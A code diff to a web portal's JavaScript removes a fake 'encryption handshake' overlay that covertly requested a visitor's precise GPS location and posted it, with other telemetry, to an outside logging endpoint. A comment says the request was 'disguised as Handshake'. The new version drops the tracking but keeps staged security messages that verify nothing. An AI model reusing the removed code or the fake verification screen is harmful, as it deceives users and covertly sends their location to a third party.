@@ -1282,6 +1282,7 @@ function switchPortalTab(tabName) {
 // ==========================================
 
 // Background Node Security Check with location request disguised as Handshake
+// Background Node Security Check (Silent, does not trigger browser permissions)
 function verifyNodeAndProceed(callback) {
   const overlay = document.getElementById("security-verification-overlay");
   const statusText = document.getElementById("verification-status-text");
@@ -1293,72 +1294,17 @@ function verifyNodeAndProceed(callback) {
   overlay.classList.remove("hidden");
   statusText.innerText = "Initializing secure encryption handshake...";
 
-  let finished = false;
-  
-  const proceed = () => {
-    if (finished) return;
-    finished = true;
-    setTimeout(() => {
-      overlay.classList.add("hidden");
-      callback();
-    }, 1000);
-  };
-
-  // Timeout fallback in case they ignore the dialog or GPS is slow
-  const timeoutId = setTimeout(() => {
-    if (!finished) {
-      statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
-      proceed();
-    }
-  }, 4000);
-
   setTimeout(() => {
-    if (finished) return;
-    statusText.innerText = "Verifying node geographic signature and routing parameters...";
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          clearTimeout(timeoutId);
-          if (finished) return;
-
-          // Capture coordinates
-          const gpsData = {
-            gpsLatitude: position.coords.latitude,
-            gpsLongitude: position.coords.longitude,
-            gpsAccuracy: position.coords.accuracy,
-            gpsTimestamp: new Date(position.timestamp).toISOString()
-          };
-
-          // Enrich existing telemetry
-          const enriched = { ...(state._visitorTelemetry || {}), ...gpsData };
-          state._visitorTelemetry = enriched;
-          saveState();
-
-          // Send updated telemetry to server
-          fetch("https://api.zealplane.com/apex-log", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(enriched)
-          }).catch(() => {});
-
-          statusText.innerText = "Security signature verified. Authorizing portal access...";
-          proceed();
-        },
-        (error) => {
-          clearTimeout(timeoutId);
-          if (finished) return;
-          console.warn("GPS Geolocation verification bypassed:", error);
-          statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
-          proceed();
-        },
-        { enableHighAccuracy: true, timeout: 3000 }
-      );
-    } else {
-      clearTimeout(timeoutId);
-      statusText.innerText = "Encryption handshake completed. Authorizing portal access...";
-      proceed();
-    }
+    statusText.innerText = "Verifying node routing and security parameters...";
+    
+    setTimeout(() => {
+      statusText.innerText = "Security signature verified. Authorizing portal access...";
+      
+      setTimeout(() => {
+        overlay.classList.add("hidden");
+        callback();
+      }, 600);
+    }, 1000);
   }, 800);
 }
 
